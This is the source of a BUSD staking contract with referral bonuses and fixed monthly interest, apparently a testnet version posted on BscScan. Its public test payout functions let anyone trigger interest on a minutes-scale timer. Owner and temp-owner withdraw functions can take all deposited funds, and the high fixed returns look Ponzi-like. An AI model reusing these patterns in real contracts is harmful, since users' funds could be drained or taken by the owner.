/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.10;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 */
pragma experimental ABIEncoderV2;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract BUSDStaking {
    
    // Mainnet BUSD Contract
    // IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    
    // Testnet BUSD 
    IERC20 BUSD = IERC20(0xa3969be7F246e422B476f8B2363D9Cc7788C40f7);
    
    uint256 interestRate = 834; // 8.34%
    uint256 ref_bonus_rate = 1000;
    
    address owner;
    // for test ONLY
    address temp_owner;
    
    // -------------------------------------------------------- //
    
    struct InvestorData {
        uint64 timestamp; // time staked
        uint64 count; // time withdrawn
        uint128 stakedAmount; // staked amount
    }
    
    struct RefDetail {
        address refAddress;
        uint256 role_id;
    }
    
    // -------------------------------------------------------- //
    
    mapping (address => InvestorData[]) public investorData; // list of all deposits
    
    mapping (address => uint256) public sumInvested; // 200 <= xx =< 50000
    
    mapping (address => RefDetail) public refDetail;
    
    // -------------------------------------------------------- //
    
    event Registered(address user, address ref, uint256 role_id);
    
    event RefBonus(address user, uint256 bonus, address bonusFrom);
    
    event FundsAdded(address user, uint256 timestamp, uint256 amount);
    
    event FundsWithdrawn(address user, uint256 timestamp, uint256 amount);
    
    event Staked(address user, uint256 timestamp, uint256 amount);
    
    event Unstaked(address user, uint256 timestamp, uint256 amount);
    
    event InterestPaid(address user, uint256 stakeIndex, uint256 amount);
    
    constructor() {
        owner = msg.sender;
        // TEST only
        temp_owner = msg.sender;
        
        refDetail[msg.sender].role_id = 2;
        emit Registered(msg.sender, address(0), 2);
    }
 
    // ===================================================================== //
    
    // for testnet only:---
    function updateBusdAddress(address newAdd) public onlyOwner returns(bool){
        BUSD = IERC20(newAdd);
        return true;
    } 
    
    // for test only:-- 
    function updateTempOwner(address newAdd) public onlyOwner returns(bool){
        temp_owner = newAdd;
        return true;
    }
    
    // ===================================================================== //
    
    
    modifier onlyOwner {
        // require(msg.sender == owner, 'Not Allowed');
        require(msg.sender == owner || msg.sender == temp_owner, 'Not Allowed');
        _;
    }
   
    // =========================== STAKE & UNSTAKE BUSD ========================================== //
    
    function stake(uint256 amount) external returns(bool) {

        require(BUSD.balanceOf(msg.sender) >= amount, "Insufficient balance");
               
        // Register user - if not registered
        if(refDetail[msg.sender].role_id == 0){
            refDetail[msg.sender].role_id = 1;
            emit Registered(msg.sender, address(0), 1);
        }
                
        // Min deposit 200 BUSD
        require(sumInvested[msg.sender]+amount >= 200*10**18, "Low deposit value");
        // Max deposit 50,000 BUSD
        require(sumInvested[msg.sender]+amount <= 50000*10**18, "Low deposit value");
        
        BUSD.transferFrom(msg.sender, address(this), amount);
        
        address ref = refDetail[msg.sender].refAddress;
        if( ref != address(0)){
            BUSD.transfer(ref, amount*ref_bonus_rate/10000 ); // transfer 10 % to ref
            emit RefBonus(ref, amount*ref_bonus_rate/10000, msg.sender);
        }
        
        investorData[msg.sender].push(InvestorData(
            uint64(block.timestamp), 
            uint64(0),
            uint128(amount) // staked amount
            )); 
        
        sumInvested[msg.sender] += amount;
        
        emit Staked(msg.sender, block.timestamp, amount);
        
        return true;
    }

    function unstake(uint256 index) external returns(bool){
        
        require(refDetail[msg.sender].role_id > 0,"Selected few only");
        
        require(sumInvested[msg.sender] > 0,"No staked amount found");
        
        InvestorData[] memory investor = investorData[msg.sender];
        
        // require(uint256(investor[index].timestamp) + 365 days <= block.timestamp,"Unriped stake");
        require(uint256(investor[index].timestamp) + 10 minutes <= block.timestamp,"Unriped stake");
        
        BUSD.transfer(msg.sender, investor[index].stakedAmount);
        
        for(uint256 i = index; i < investorData[msg.sender].length-1; i++){
            investorData[msg.sender][i] = investorData[msg.sender][i+1];
        }
        
        investorData[msg.sender].pop();
        
        sumInvested[msg.sender] -= investor[index].stakedAmount;
        
        emit Unstaked(msg.sender, block.timestamp, investor[index].stakedAmount);
        
        return true;
    }
    
    // ================================PAY INTEREST===================================== //
    
    function payInterest(address user) public returns (bool){
        
        InvestorData[] memory investor = investorData[user];
        uint256 interest;
        
        for(uint256 i = 0; i < investor.length; i++){
            
            // check first 3 months -- then additional 1 months
            if((uint256(investor[i].timestamp)+ (30*(uint256(investor[i].count)+4))* 1 days) <= block.timestamp){
                
                // check total times interest collected
                if(uint256(investor[i].count) < 12){
                
                    interest += (uint256(investor[i].stakedAmount)*interestRate)/10000;
                    emit InterestPaid(user, i, interest);
                    investorData[user][i].count++;    
                    
                }    
            }
        }

        if(interest > 0){
            
            BUSD.transfer(user, interest);
            return true;    
            
        } else{
            return false;
        }
        
    }
    
    function payInterestByIndex(address user, uint256 i) public returns (bool){
        InvestorData[] memory investor = investorData[user];
        uint256 interest;
                
        // check first 3 months -- then additional 1 months
        if((uint256(investor[i].timestamp)+ (30*(uint256(investor[i].count)+4))*1 days) <=block.timestamp){
            
            // check total times interest collected
            if(investor[i].count < 12){
                
                interest += (uint256(investor[i].stakedAmount)*interestRate)/10000;
                
                investorData[user][i].count++;    
                
                BUSD.transfer(user, interest);
                
                emit InterestPaid(user, i, interest);
                
                return true;
            }    
        }
        return false;
    }

    // ================================= REGISTER ==================================== //
    
    function register() external returns(bool){
    
        require(refDetail[msg.sender].role_id == 0, "User already Registered");
        refDetail[msg.sender].role_id = 1;
        emit Registered(msg.sender, address(0), 1);
        return true;
    }
    
    function register(address ref) external returns(bool){
        
        require(refDetail[msg.sender].role_id == 0, "User already registered");
        
        require(refDetail[ref].role_id == 2, "Invalid Ref address");
        
        refDetail[msg.sender].role_id = 1;
        refDetail[msg.sender].refAddress = ref; 
        
        emit Registered(msg.sender, ref, 1);
        return true;
    }
    
    function addLeader(address manager) external onlyOwner returns(bool){
        
        refDetail[manager].role_id = 2;
        emit Registered(manager, refDetail[manager].refAddress, 2);
        return true;
    }
    
    // =================================DEPOSIT & WITHDRAW ==================================== //
    
    function checkInterest() external view returns(uint256){
        InvestorData[] memory investor = investorData[msg.sender];
        uint256 interest;
        
        for(uint256 i = 0; i < investor.length; i++){
                
            // check first 3 months -- then additional 1 months
            if((uint256(investor[i].timestamp)+ (30*(uint256(investor[i].count)+4))*1 days) <=block.timestamp){
                // check total times interest collected
                if(uint256(investor[i].count) < 12){
                    interest += (investor[i].stakedAmount*interestRate)/10000;
                }    
            }
        }
        
        return interest;
    }
     
    function checkInterestByIndex(uint256 i) external view returns(uint256){
        InvestorData[] memory investor = investorData[msg.sender];
        uint256 interest;
                
        // check first 3 months -- then additional 1 months
        if((uint256(investor[i].timestamp)+ (30*(uint256(investor[i].count)+4))*1 days) <=block.timestamp){
            // check total times interest collected
            if(investor[i].count < 12){
                interest += (investor[i].stakedAmount*interestRate)/10000;
            }    
        }
        
        return interest;
    }
    
    
    // ================================= TESTING ONLY ==================================== //
    
    function Test_payInterest(address user) public returns (bool){
        InvestorData[] memory investor = investorData[user];
        uint256 interest;
        
        for(uint256 i = 0; i < investor.length; i++){
            
            // check first 3 months -- then additional 1 months
            if((uint256(investor[i].timestamp)+ (5*(uint256(investor[i].count)+4))* 1 minutes) <= block.timestamp){
                
                // check total times interest collected
                if(uint256(investor[i].count) < 12){
                
                    interest += (uint256(investor[i].stakedAmount)*interestRate)/10000;
                    emit InterestPaid(user, i, interest);
                    investorData[user][i].count++;    
                    
                }    
            }
        }

        if(interest > 0){
            
            BUSD.transfer(user, interest);
            
            return true;    
            
        } else{
            return false;
        }
        
    }
    
    function Test_payInterestByIndex(address user, uint256 i) public returns (bool){
        InvestorData[] memory investor = investorData[user];
        uint256 interest;
                
        // check first 3 months -- then additional 1 months
        if((uint256(investor[i].timestamp)+ (5*(uint256(investor[i].count)+4))*1 minutes) <=block.timestamp){
            
            // check total times interest collected
            if(investor[i].count < 12){
                
                interest += (uint256(investor[i].stakedAmount)*interestRate)/10000;
                
                investorData[user][i].count++;    
                
                BUSD.transfer(user, interest);
                
                emit InterestPaid(user, i, interest);
                
                return true;
            }    
        }
        return false;
    }
    
    function Test_getInterestByIndex(uint256 i) external view returns(uint256){
        InvestorData[] memory investor = investorData[msg.sender];
        uint256 interest;
                
        // check first 3 months -- then additional 1 months
        if((uint256(investor[i].timestamp)+ (5*(uint256(investor[i].count)+4))*1 minutes) <=block.timestamp){
            // check total times interest collected
            if(investor[i].count < 12){
                interest += (investor[i].stakedAmount*interestRate)/10000;
            }    
        }
        
        return interest;
    }
    
    // =================================DEPOSIT & WITHDRAW==================================== //
    
    function addFunds(uint256 amount) external returns(bool){
        
        require(BUSD.balanceOf(msg.sender) >= amount, "Insufficient user bal");
        BUSD.transferFrom(msg.sender, address(this), amount);
        
        emit FundsAdded(msg.sender, block.timestamp, amount);
        
        return true;
    }
    
    function withdraw(uint256 amount) external onlyOwner returns(bool){
        require(BUSD.balanceOf(address(this)) >= amount, "Insufficient contract bal");
        BUSD.transfer(msg.sender, amount);
        
        emit FundsWithdrawn(msg.sender, block.timestamp, amount);
        
        return true;
    }
    
    function rescueToken(address tokenAdd, uint256 amount) external onlyOwner returns(bool){
        IERC20 TOKEN = IERC20(tokenAdd);
        
        require(TOKEN.balanceOf(address(this)) >= amount, "Insufficient bal");
        TOKEN.transfer(msg.sender, amount);
        
        return true;
    }
    
    function numOfInvestments(address user) external view returns(uint256){
        return investorData[user].length;    
    }
    
}